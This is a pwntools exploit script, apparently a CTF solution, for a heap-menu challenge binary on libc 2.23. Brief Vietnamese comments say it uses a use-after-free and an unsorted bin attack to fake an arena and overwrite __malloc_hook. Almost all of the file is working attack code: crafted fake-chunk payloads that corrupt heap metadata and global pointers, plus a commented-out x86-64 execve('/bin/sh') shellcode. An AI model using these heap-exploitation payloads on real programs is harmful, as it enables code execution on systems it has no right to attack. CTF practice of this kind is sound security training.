from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
interrupt
set max-visualize-chunk-size 0x100
continue
'''.format(**locals())

#Binary filename
exe = './timu_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.23.so")
context(arch = "amd64", os = "linux")

'''
khai thac loi UAF (ngoai ra co double free nhung hinh nhu eo dung)
co ban thi dung unsorted bin attack
Bài này giống như làm giả 1 arena vậy, nhờ đó mà chúng ta có thể ghi 
lên _malloc_hook và thực hiện shellcode
'''

def alloc(size, data):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', str(size))
    p.sendafter('Data: ', data)

def free(index):
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str(index))

def update(index, data):
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str(index))
    p.sendlineafter('Size: ', str(len(data)))
    p.sendafter('Data: ', data)

bss = 0x601020
buf = 0x601040

alloc(0x90, "index0")
alloc(0x90, "index1")
payload = p64(0) + p64(0x91) + p64(buf - 0x18) + p64(buf - 0x10)
payload += p64(0) * 14 + p64(0x90) + p64(0xa0)
update(0, payload)
free(1)

payload = p64(1) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
update(0, payload)

alloc(0x100, "index2")
alloc(0x100, "index3")

free(2)
payload = p64(0) + p64(buf + 0x20)
update(2, payload)

alloc(0x100, "index4")
payload = p64(bss) + p64(buf) + p64(0) * 4 + b"\x10"
update(1, payload)

# shellcode = b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
# update(0, shellcode)

# update(6, p64(bss))
# p.sendlineafter(':', '1')
# p.sendlineafter(':', "1")

p.interactive()
